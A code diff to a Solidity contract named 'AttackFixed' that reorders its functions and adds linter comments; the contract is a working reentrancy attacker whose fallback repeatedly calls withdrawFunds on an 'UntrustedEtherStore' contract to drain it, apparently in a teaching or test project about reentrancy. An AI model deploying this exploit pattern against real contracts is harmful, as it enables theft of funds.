@@ -41,19 +41,10 @@ contract AttackFixed is Ownable {
         untrustedEtherStore = UntrustedEtherStore(_untrustedEtherStoreAddress);
     }
 
+    // solhint-disable-next-line no-empty-blocks
     receive() external payable {}
 
-    function attackUntrustedEtherStore() public payable onlyOwner {
-        require(msg.value >= 1 ether, "AttackFixed: Requires 1 ether.");
-        untrustedEtherStore.depositFunds{value: 1 ether}();
-        untrustedEtherStore.withdrawFunds(1 ether);
-    }
-
-    function collectEther() public onlyOwner {
-        (bool success, ) = msg.sender.call{value: address(this).balance}("");
-        require(success, "AttackFixed: Transaction failed.");
-    }
-
+    // solhint-disable-next-line no-complex-fallback
     fallback() external payable {
         // Log `fallback()` calls for checking successful reentrancy attacks.
         emit LogFallbackCall(msg.sender, msg.value);
@@ -61,5 +52,17 @@ contract AttackFixed is Ownable {
         if (address(untrustedEtherStore).balance > 1 ether) {
             untrustedEtherStore.withdrawFunds(1 ether);
         }
+    }
+
+    function attackUntrustedEtherStore() public payable onlyOwner {
+        require(msg.value >= 1 ether, "Requires 1 ether");
+        untrustedEtherStore.depositFunds{value: 1 ether}();
+        untrustedEtherStore.withdrawFunds(1 ether);
+    }
+
+    function collectEther() public onlyOwner {
+        // solhint-disable-next-line avoid-low-level-calls
+        (bool success, ) = msg.sender.call{value: address(this).balance}("");
+        require(success, "Transaction failed");
     }
 }
